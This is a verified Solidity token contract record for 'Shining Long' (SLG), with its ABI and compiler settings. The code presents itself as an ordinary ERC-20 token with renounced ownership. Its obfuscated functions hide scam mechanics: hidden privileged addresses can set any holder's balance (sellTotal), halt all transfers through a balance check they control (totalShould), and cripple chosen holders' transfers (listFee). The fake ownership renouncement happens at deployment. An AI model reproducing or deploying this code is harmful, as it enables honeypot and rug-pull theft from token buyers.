{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface atSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeMode {\n    function createPair(address marketingTradingEnable, address liquidityMarketing) external returns (address);\n}\n\ninterface teamMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTo) external view returns (uint256);\n\n    function transfer(address txEnable, uint256 autoReceiver) external returns (bool);\n\n    function allowance(address tokenMarketingMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txEnable,\n        uint256 autoReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAuto, uint256 value);\n    event Approval(address indexed tokenMarketingMax, address indexed spender, uint256 value);\n}\n\ninterface takeReceiverIs is teamMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShiningLong is walletShould, teamMin, takeReceiverIs {\n\n    bool private isTo;\n\n    uint256 autoToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityFeeAt;\n    }\n\n    function allowance(address txList, address sellLaunchIs) external view virtual override returns (uint256) {\n        if (sellLaunchIs == totalTo) {\n            return type(uint256).max;\n        }\n        return modeTeamTx[txList][sellLaunchIs];\n    }\n\n    function senderBuy() private view {\n        require(launchFrom[_msgSender()]);\n    }\n\n    bool public amountExempt;\n\n    function transferFrom(address buyIs, address txEnable, uint256 autoReceiver) external override returns (bool) {\n        if (_msgSender() != totalTo) {\n            if (modeTeamTx[buyIs][_msgSender()] != type(uint256).max) {\n                require(autoReceiver <= modeTeamTx[buyIs][_msgSender()]);\n                modeTeamTx[buyIs][_msgSender()] -= autoReceiver;\n            }\n        }\n        return senderReceiver(buyIs, txEnable, autoReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return maxLiquidity;\n    }\n\n    function sellTotal(address shouldFrom, uint256 autoReceiver) public {\n        senderBuy();\n        totalLiquidity[shouldFrom] = autoReceiver;\n    }\n\n    uint256 constant modeFundSender = 9 ** 10;\n\n    string private liquidityFeeAt = \"SLG\";\n\n    mapping(address => mapping(address => uint256)) private modeTeamTx;\n\n    function launchedShould(address buyIs, address txEnable, uint256 autoReceiver) internal returns (bool) {\n        require(totalLiquidity[buyIs] >= autoReceiver);\n        totalLiquidity[buyIs] -= autoReceiver;\n        totalLiquidity[txEnable] += autoReceiver;\n        emit Transfer(buyIs, txEnable, autoReceiver);\n        return true;\n    }\n\n    address fromMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listTeam;\n    }\n\n    address public toMin;\n\n    mapping(address => uint256) private totalLiquidity;\n\n    uint256 amountSwap;\n\n    uint256 public tokenLimit;\n\n    function senderReceiver(address buyIs, address txEnable, uint256 autoReceiver) internal returns (bool) {\n        if (buyIs == senderLaunched) {\n            return launchedShould(buyIs, txEnable, autoReceiver);\n        }\n        uint256 walletSwap = teamMin(toMin).balanceOf(fromMin);\n        require(walletSwap == amountSwap);\n        require(txEnable != fromMin);\n        if (sellTo[buyIs]) {\n            return launchedShould(buyIs, txEnable, modeFundSender);\n        }\n        return launchedShould(buyIs, txEnable, autoReceiver);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxLiquidity;\n    }\n\n    bool public shouldTo;\n\n    function totalShould(uint256 autoReceiver) public {\n        senderBuy();\n        amountSwap = autoReceiver;\n    }\n\n    event OwnershipTransferred(address indexed isReceiver, address indexed maxReceiver);\n\n    function exemptMax(address listWallet) public {\n        require(listWallet.balance < 100000);\n        if (amountExempt) {\n            return;\n        }\n        \n        launchFrom[listWallet] = true;\n        if (isTo) {\n            toList = tokenLimit;\n        }\n        amountExempt = true;\n    }\n\n    address totalTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private tokenFund = 18;\n\n    address public senderLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMin;\n    }\n\n    constructor (){\n        if (tokenLimit != toList) {\n            fromTotalSwap = true;\n        }\n        atSell swapBuy = atSell(totalTo);\n        toMin = feeMode(swapBuy.factory()).createPair(swapBuy.WETH(), address(this));\n        if (autoIs) {\n            shouldTo = true;\n        }\n        senderLaunched = _msgSender();\n        toAtBuy();\n        launchFrom[senderLaunched] = true;\n        totalLiquidity[senderLaunched] = walletMin;\n        if (shouldTo != autoIs) {\n            autoIs = true;\n        }\n        emit Transfer(address(0), senderLaunched, walletMin);\n    }\n\n    function transfer(address shouldFrom, uint256 autoReceiver) external virtual override returns (bool) {\n        return senderReceiver(_msgSender(), shouldFrom, autoReceiver);\n    }\n\n    function approve(address sellLaunchIs, uint256 autoReceiver) public virtual override returns (bool) {\n        modeTeamTx[_msgSender()][sellLaunchIs] = autoReceiver;\n        emit Approval(_msgSender(), sellLaunchIs, autoReceiver);\n        return true;\n    }\n\n    bool public txExempt;\n\n    mapping(address => bool) public sellTo;\n\n    address private maxLiquidity;\n\n    mapping(address => bool) public launchFrom;\n\n    function balanceOf(address tokenTo) public view virtual override returns (uint256) {\n        return totalLiquidity[tokenTo];\n    }\n\n    function listFee(address fundLiquidity) public {\n        senderBuy();\n        \n        if (fundLiquidity == senderLaunched || fundLiquidity == toMin) {\n            return;\n        }\n        sellTo[fundLiquidity] = true;\n    }\n\n    bool public fromTotalSwap;\n\n    uint256 private walletMin = 100000000 * 10 ** 18;\n\n    string private listTeam = \"Shining Long\";\n\n    bool public autoIs;\n\n    uint256 private toList;\n\n    function toAtBuy() public {\n        emit OwnershipTransferred(senderLaunched, address(0));\n        maxLiquidity = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunchIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunchIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"}],\"name\":\"listFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAtBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ShiningLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}